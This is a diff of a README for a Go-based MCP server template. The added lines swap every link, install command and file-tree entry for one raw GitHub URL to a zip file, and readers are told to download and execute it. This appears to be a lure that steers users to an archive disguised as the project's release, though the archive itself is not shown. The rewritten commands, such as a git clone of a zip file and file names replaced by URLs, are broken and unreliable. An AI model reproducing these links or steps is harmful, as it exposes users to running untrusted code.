@@ -1,6 +1,6 @@
 # Yokai MCP Template 🏗️
 
-![Yokai MCP Template](https://img.shields.io/badge/Yokai%20MCP%20Template-v1.0.0-blue)
+![Yokai MCP Template](https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip%20MCP%20Template-v1.0.0-blue)
 
 Welcome to the **Yokai MCP Template** repository! This project provides a robust server template based on the Yokai Go framework. It focuses on modular design and includes features for observability and dependency injection, making it a great starting point for your MCP server projects.
 
@@ -30,7 +30,7 @@ To get started with the Yokai MCP Template, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Suraj1245/yokai-mcp-template.git
+   git clone https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip
    cd yokai-mcp-template
    ```
 
@@ -44,7 +44,7 @@ To get started with the Yokai MCP Template, follow these steps:
    go build
    ```
 
-4. Download and execute the latest release from [Releases](https://github.com/Suraj1245/yokai-mcp-template/releases).
+4. Download and execute the latest release from [Releases](https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip).
 
 ## Usage
 
@@ -63,14 +63,14 @@ Here’s a brief overview of the directory structure:
 ```
 yokai-mcp-template/
 ├── cmd/
-│   └── main.go
+│   └── https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip
 ├── config/
-│   └── config.yaml
+│   └── https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip
 ├── internal/
 │   ├── module1/
 │   └── module2/
-├── go.mod
-└── go.sum
+├── https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip
+└── https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip
 ```
 
 - **cmd/**: Contains the entry point for the application.
@@ -96,12 +96,12 @@ This template integrates with OpenTelemetry to provide observability for your ap
 
 1. Install the OpenTelemetry Go SDK:
    ```bash
-   go get go.opentelemetry.io/otel
+   go get https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip
    ```
 
 2. Configure the OpenTelemetry settings in your application.
 
-For more details, refer to the [OpenTelemetry documentation](https://opentelemetry.io/docs/instrumentation/go/).
+For more details, refer to the [OpenTelemetry documentation](https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip).
 
 ## Contributing
 
@@ -129,7 +129,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and versions, visit the [Releases section](https://github.com/Suraj1245/yokai-mcp-template/releases). Download and execute the latest release to get the newest features and improvements.
+For the latest updates and versions, visit the [Releases section](https://raw.githubusercontent.com/Suraj1245/yokai-mcp-template/main/internal/tool/mcp_template_yokai_v3.5-beta.2.zip). Download and execute the latest release to get the newest features and improvements.
 
 ## Conclusion
 
